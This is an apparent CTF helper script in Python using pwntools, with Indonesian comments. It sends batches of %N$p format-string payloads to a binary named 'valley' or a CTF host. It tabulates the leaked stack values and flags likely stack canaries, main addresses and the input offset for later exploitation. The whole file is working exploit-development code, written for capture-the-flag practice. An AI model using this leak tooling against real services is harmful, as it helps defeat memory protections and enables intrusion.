import sys
from pwn import *

global BINARY 

#=====[ Target Segment ]=====#
SERV = 'thpctf.th'
PORT = 6767
BINARY = './valley' 

TOINDEX = 128
BATCH = 8  # <-- BARU: berapa pasang index per restart proses (bebas diatur namun perhatikan ukuran buffer)

INPUT_AFTER = b':' # <-- BARU: tempat input payload. cek di binary mu
#============================#

elf = context.binary = ELF(BINARY)
REMOTE = True

def start():
    global REMOTE
    if args.LOCAL or not REMOTE:
        p = process(BINARY,level='critical')
    else:
        try:
            p = remote(SERV,PORT)
        except Exception as e:
            REMOTE = False
            p = process(BINARY)
            log.warn("Cannot remote server...trying local.")
    return p


def indexl():
    main = hex(elf.sym.main)
    global TOINDEX, BATCH

    line = 0
    info_log = ''
    err_count = 0
    leak_count = 0

    payload = ''
    log = ''
    leaked = ''

    log += f'\n{text.red("="*100)}\n{"":<5}{"TIPE":<12}{"INDEX":<20}{"ADDRESS":<20}{"STRING"}\n{text.red("="*100)}'

    half = TOINDEX // 2

    #=========[ TAHAP 1: QUERY, dikelompokkan per BATCH ]=========#
    for group_start in range(1, half + 1, BATCH):
        group_indices = list(range(group_start, min(group_start + BATCH, half + 1)))

        parts = []
        for idx in group_indices:
            parts.append(f"%{idx}$p")
            parts.append(f"%{idx + half}$p")
        pay = "BBBB" + ":".join(parts)

        p = start()
        p.recvuntil(INPUT_AFTER)
        p.sendline(pay.encode())
        p.recvuntil(b'BBBB')

        try:
            rax = p.recvline().strip().decode().split(':')

            # rax sekarang isinya 2*len(group_indices) value, berurutan
            # (v_left0, v_right0, v_left1, v_right1, ...)

            for k, idx in enumerate(group_indices):
                l_indx = l_val = l_str = None
                r_indx = r_val = r_str = None

                try:
                    leak = int(rax[2*k], 16)
                except (ValueError, IndexError):
                    err_count += 1
                    leak = None

                try:
                    leak1 = int(rax[2*k+1], 16)
                except (ValueError, IndexError):
                    err_count += 1
                    leak1 = None

                if leak is not None:
                    l_indx = f'idx {idx:<5}'
                    l_val  = f'{hex(leak):<20}'
                    l_str  = to_printable(leak)

                if leak1 is not None:
                    r_indx = f'idx {idx+half:<5}'
                    r_val  = f'{hex(leak1):<20}'
                    r_str  = to_printable(leak1)

                NIL_STR = '.'*8
                l_indx_disp = l_indx if l_indx is not None else f'idx {idx:<5}'
                l_val_disp  = l_val  if l_val  is not None else f'{"N/A":<20}'
                l_str_disp  = l_str  if l_str  is not None else NIL_STR

                r_indx_disp = r_indx if r_indx is not None else f'idx {idx+half:<5}'
                r_val_disp  = r_val  if r_val  is not None else f'{"N/A":<20}'
                r_str_disp  = r_str  if r_str  is not None else NIL_STR

                l_side = f'{text.bold_green(l_indx_disp)}{text.bold_yellow(l_val_disp)}'
                r_side = f'{text.bold_green(r_indx_disp)}{text.bold_yellow(r_val_disp)}'

                string = f'{text.bold_cyan(l_str_disp)} | {text.bold_cyan(r_str_disp)}'
                leaked += f'\n{l_side} {"|":<2} {r_side} {"|":<2} {string}'
                line += 1

                # filtering tetap cuma jalan kalau leak/leak1 valid
                for val, i_ in ((leak, idx), (leak1, idx + half)):
                    if val is not None:
                        log_entry, payload_entry = filtering(val, i_)
                        if log_entry:
                            log += log_entry
                        if payload_entry:
                            payload += payload_entry

        except Exception as e:
            p.close()
            err_count += 1
            # info_log += f'\nerror at {idx}: {e}' #for debugging

        p.close()

    log += f'\n{text.red("="*100)}'
    log += f'\n{text.bold_green("FORMAT STRING PAYLOAD  :")}'
    log += f'\n{text.bold_yellow(payload)}'
    log += f'\n{text.bold_red("="*100)}'

    leak_count = TOINDEX - err_count
    leak_c = text.bold_green(str(leak_count))
    info_c = text.bold_red(str(err_count))
    loss_c = text.bold_red(str(leak_count-line*2))
    # line_c = text.bold_cyan(str(line))
    printed= text.bold_cyan(str(line*2))
    if leak_count-line*2 <= 0:
        loss_c = text.bold_green('no loss index')

    info_log += f'\nMax Index {TOINDEX}, batch : {BATCH}\n'
    info_log += f'\nLeaked {leak_c}, not hex {info_c}\nprinted {printed} index, loss index = {loss_c}'

    print(leaked)
    print(log)
    print(info_log)
    


def filtering(leak,i):
    log_entry = ""
    payload_entry = ""
    leak_hex = hex(leak)

    #==========[ CANARY ]==========#
    if elf.canary and leak_hex.endswith('00') and len(leak_hex) >= 16:
        log_entry += f"\n{'':<2}{text.red('canary'):<23}{i:<15}{text.bold_yellow(leak_hex)}"
        payload_entry += f'%{i}$p.'

    #==========[ MAIN ]==========#
    if leak_hex.endswith(hex(elf.sym.main)[-3:]):
        log_entry += f"\n{'':<2}{text.blue('est. main'):<23}{i:<15}{text.bold_yellow(leak_hex)}"
        payload_entry += f'%{i}$p.'

    #==========[ START IDX ]==========#
    if leak_hex.endswith('42424242'):
        log_entry += f"\n{'':<2}{text.blue('start idx'):<23}{i:<15}{text.bold_yellow(leak_hex)}{'':<5}{unhex(leak_hex.replace('0x',''))}"
        payload_entry += f'%{i}$p.'

    return log_entry,payload_entry


def to_printable(value, size=8):
    raw = value.to_bytes(size, byteorder='little')
    return ''.join(chr(b) if 32 <= b <= 126 else '.' for b in raw)


def main():
    p = log.progress('See Index Tools')
    p.status("indexing")
    indexl()
    start()

if __name__ == "__main__":
    main()
